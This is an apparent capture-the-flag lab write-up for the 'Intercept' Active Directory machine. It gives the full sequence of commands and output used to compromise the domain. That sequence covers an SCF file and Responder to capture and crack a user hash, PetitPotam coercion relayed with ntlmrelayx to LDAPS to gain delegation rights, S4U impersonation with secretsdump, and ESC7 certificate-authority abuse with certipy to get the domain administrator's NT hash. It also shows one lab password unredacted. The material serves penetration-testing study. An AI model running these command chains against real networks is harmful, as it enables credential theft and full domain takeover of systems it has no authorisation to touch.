# Intercept
![](images/intercept.png)


IPs: `10.10.233.69` `10.10.233.70`

# Recon
nmap:

10.10.233.69 dc.intercept.vl
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-19 06:21:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

10.10.233.70: ws01.intercept.vl
```
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

Checking smb there are a few shares on ws01:
```
smbclient -L \\\\ws01 -U anonymous
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        dev             Disk      shared developer workspace
        IPC$            IPC       Remote IPC
        Users           Disk      

```

There is a note in the dev directory mentioning that users are likely to open this share. With this in mind we can upload a scf file and grab the hash of the user with responder.

# Domain Account
Starting responder:
```
./Responder.py -I tun0
```

Then uploading a scf file and waiting we get back a hash!
```
Kathryn.Spencer::INTERCEPT:dc003c7e36994241:6406112A373268C179CCA9CB21DF2902:0101000000000000002CD5078422DB01B8D57F6565B8F67900000000020008004A0034005000320001001E00570049004E002D00430054004B00570046004D003800490043005500300004003400570049004E002D00430054004B00570046004D00380049004300550030002E004A003400500032002E004C004F00430041004C00030014004A003400500032002E004C004F00430041004C00050014004A003400500032002E004C004F00430041004C0007000800002CD5078422DB0106000400020000000800300030000000000000000000000000200000F1BECEB871CC74C48FC884C8F3C3C9E6AB41C0B061BD2C1DDE8410B1A724A9580A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0030002E003100310030000000000000000000
```

Cracking this hash gives `Chocolate1`.

# Machine Takeover
Going to check if webdav is enabled on this server, if it is we should be able to use petitpotam and coerce the machine into talking to the domain controller via ldap:
```
nxc smb ws01.intercept.vl -u kathryn.spencer -p Chocolate1 -M webdav
SMB         10.10.233.70    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.10.233.70    445    WS01             [+] intercept.vl\kathryn.spencer:Chocolate1 
WEBDAV      10.10.233.70    445    WS01             WebClient Service enabled on: 10.10.233.70
```

Checking the ldap settings on the dc
```
nxc ldap dc01.intercept.vl -u kathryn.spencer -p Chocolate1 -M ldap-checker
SMB         10.10.233.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
LDAP        10.10.233.69    389    DC01             [+] intercept.vl\kathryn.spencer:Chocolate1 
LDAP-CHE... 10.10.233.69    389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 10.10.233.69    389    DC01             LDAPS Channel Binding is set to "NEVER"
```

Nice, so to set the attack up we need an account with a SPN and a dns entry pointing to our host:
```
# DNS ENTRY
python3 dnstool.py -u intercept.vl\\kathryn.spencer -p Chocolate1 -r eljay.intercept.vl -d 10.8.0.110 -a add dc01.intercept.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

# SPN account
addcomputer.py intercept.vl/kathryn.spencer:Chocolate1 -computer-name 'ws02$' -computer-pass Password123# -domain-netbios intercept
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ws02$ with password Password123#.
```

With the setup done, next is to trigger and relay the authentication to ldap:
```
ntlmrelayx.py -smb2support -t ldaps://dc01.intercept.vl --http-port 8080 --delegate-access --escalate-user 'ws02$'

# trigger the authentication
python3 petitpotam.py -u kathryn.spencer -p Chocolate1 -d intercept.vl eljay@8080/a ws01.intercept.vl
```

Checking the output of ntlmrelayx shows that we can now impersonate users on ws01!
```
[*] Servers started, waiting for connections
[*] HTTPD(8080): Connection from 10.10.233.70 controlled, attacking target ldaps://dc01.intercept.vl
[*] HTTPD(8080): Authenticating against ldaps://dc01.intercept.vl as INTERCEPT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] Delegation rights modified succesfully!
[*] ws02$ can now impersonate users on WS01$ via S4U2Proxy
```

Requesting a ticket impersonating administrator then dumping secrets:
```
getST.py -spn cifs/ws01.intercept.vl intercept.vl/ws02\$:Password123# -impersonate administrator
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_ws01.intercept.vl@INTERCEPT.VL.ccache

KRB5CCNAME=$(pwd)/administrator\@cifs_ws01.intercept.vl\@INTERCEPT.VL.ccache secretsdump.py -k -no-pass administrator@ws01.intercept.vl
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x04718518c7f81484a5ba5cc7f16ca912
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
... snip ...
Simon.Bowen@intercept.vl:<REDACTED>
```

# Domain Admin
Now is a good time to run bloodhound and also certipy, incase there is ADCS.
Looking at the certipy output:
```
certipy find -u simon.bowen@intercept.vl -p <REDACTED> -text -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

... snip ...
Certificate Authorities
  0
    CA Name                             : intercept-DC01-CA
    DNS Name                            : DC01.intercept.vl
    Certificate Subject                 : CN=intercept-DC01-CA, DC=intercept, DC=vl
    Certificate Serial Number           : 543FC545FFCDDB86463B30782A2C2E7A
    Certificate Validity Start          : 2023-06-27 13:24:59+00:00
    Certificate Validity End            : 2124-10-19 13:04:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : INTERCEPT.VL\Administrators
      Access Rights
        Enroll                          : INTERCEPT.VL\Authenticated Users
        ManageCa                        : INTERCEPT.VL\ca-managers
                                          INTERCEPT.VL\Domain Admins
                                          INTERCEPT.VL\Enterprise Admins
                                          INTERCEPT.VL\Administrators
        ManageCertificates              : INTERCEPT.VL\Domain Admins
                                          INTERCEPT.VL\Enterprise Admins
                                          INTERCEPT.VL\Administrators

```

Also in bloodhound the simon.bowen is able to join the ca-managers group which would allow the account to manage the CA, Which is esc7.

To add the user to the group we can use net rpc:
```
net rpc group addmem "ca-managers" "simon.bowen" -U "intercept.vl"/"simon.bowen"%"<REDACTED>" -S "dc01.intercept.vl"
```

To request a certificate for a domain admin we need to become a office so we can approve templates, enable the subca. Then request and approve a certificate and finally get the NTLM hash of the user via PKINIT.
```
#become an officer
certipy ca -ca 'intercept-DC01-CA' -add-officer simon.bowen -username simon.bowen@intercept.vl -p b0OI_fHO859+Aw -dc-ip 10.10.233.69
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Simon.Bowen' on 'intercept-DC01-CA'

#enable the subca
certipy ca -ca 'intercept-DC01-CA' -enable-template 'SubCA' -username simon.bowen@intercept.vl -p <REDACTED> -dc-ip 10.10.233.69
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'intercept-DC01-CA'

#request the certificate
certipy req -username simon.bowen@intercept.vl -p <REDACTED> -ca 'intercept-DC01-CA' -target dc01.intercept.vl -template SubCA -upn administrator@intercept.vl
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 5
Would you like to save the private key? (y/N) y
[*] Saved private key to 5.key
[-] Failed to request certificate

# approve the cert
certipy ca -ca 'intercept-DC01-CA' -issue-request 5 -username simon.bowen@intercept.vl -p <REDACTED> -dc-ip 10.10.233.69
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate

# request the approved cert
certipy req -username simon.bowen@intercept.vl -p <REDACTED> -ca 'intercept-DC01-CA' -target dc01.intercept.vl -retrieve 5
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 5
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@intercept.vl'
[*] Certificate has no object SID
[*] Loaded private key from '5.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Then finally get the NTLM hash:
```
certipy auth -pfx administrator.pfx -domain intercept.vl -username administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@intercept.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@intercept.vl': aad3b435b51404eeaad3b435b51404ee:<HASH>
```
